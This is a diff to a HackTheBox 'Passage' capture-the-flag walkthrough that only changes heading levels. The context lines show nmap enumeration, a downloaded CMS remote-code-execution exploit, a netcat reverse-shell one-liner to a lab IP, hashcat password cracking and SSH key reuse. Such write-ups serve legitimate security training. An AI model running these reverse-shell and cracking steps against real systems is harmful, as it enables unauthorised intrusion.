@@ -13,15 +13,15 @@ img_path: /assets/img/hackthebox/machines/passage
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Passage](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).
 
 ![](0.png)
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.
 
@@ -49,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 We found just two ports, 22 and 80.
 
-## Web
+### Web
 
 Let's check the web page.
 
@@ -63,7 +63,7 @@ Let's check if there is any exploits in this CMS.
 
 We found a RCE exploit. let's download it [here](https://www.exploit-db.com/exploits/48800).
 
-# **Foothold**
+## **Foothold**
 
 It's time to run the exploit.`python3 exploit.py`
 
@@ -125,11 +125,11 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
 ![](3.png)
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
-## www-data --> paul
+### www-data --> paul
 
-### hashcat
+#### hashcat
 
 The exploit gave us some SHA256 hashes so let's try cracking them with `hashcat` mode 1400 
 
@@ -183,7 +183,7 @@ We found `paul` and `nadav`, let's use the password and see if we can switch to 
 
 Great! That was `paul`'s password.
 
-## paul --> nadav
+### paul --> nadav
 
 On `paul`'s home directory we find a `.ssh` directory with a private key.
 
@@ -197,7 +197,7 @@ Let's test it.
 
 They are using the same key, now we have access to both users.
 
-## nadav --> root
+### nadav --> root
 
 Now let's run `linpeas`
 
